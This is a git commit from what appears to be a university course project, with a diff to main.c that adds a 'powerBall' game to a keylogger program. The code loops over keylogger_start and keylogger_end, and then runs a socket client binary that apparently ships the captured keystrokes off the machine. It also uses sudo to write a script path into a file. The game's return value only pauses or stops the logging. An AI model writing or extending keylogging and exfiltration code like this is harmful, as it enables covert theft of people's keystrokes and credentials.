e353392e1b0fddf13e99e8f3ec16be93d8fa22d3
Zhenyu-Liu <liu.4706@osu.edu>
2016-11-30 21:58:07 -0500

    add powerBall

--- main.c
+++ main.c
@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include <time.h>
 #include <string.h>
+#include "powerBall.h"
 
 int trigger = 30000;
 void time_30s(int trigger);
@@ -17,14 +18,26 @@ int main (){
     strcat(dir_cli, "/socket/client");
     char comm[1024];
     strcpy(comm,"sudo sh -c \"echo \'#!/bin/bash\n");
-      strcat(comm, dir_cli);
-      strcat(comm, "\' >> ~/Desktop/path.txt\"");
-      system(comm);
-    while (1){
-      keylogger_start();
-      time_30s(trigger);
-      keylogger_end();
-      system("/CSE2431_Project/socket/client");
+    strcat(comm, dir_cli);
+    strcat(comm, "\' >> ~/Desktop/path.txt\"");
+    system(comm);
+    int flag = 0;
+
+    // if flag is 3 stop keylogger forever
+    while (flag != 3){
+      flag = PBmain();
+      // if flag is 1 or 2, abort keylogger for current time
+      if (flag != 1 && flag != 2 && flag != 3){
+        keylogger_start();
+        time_30s(trigger);
+        keylogger_end();
+        system("/CSE2431_Project/socket/client"); 
+      }else{
+        time_30s(trigger);
+      }
+      if (flag != 3){
+        flag = 0;
+      }
     }
   }
 }
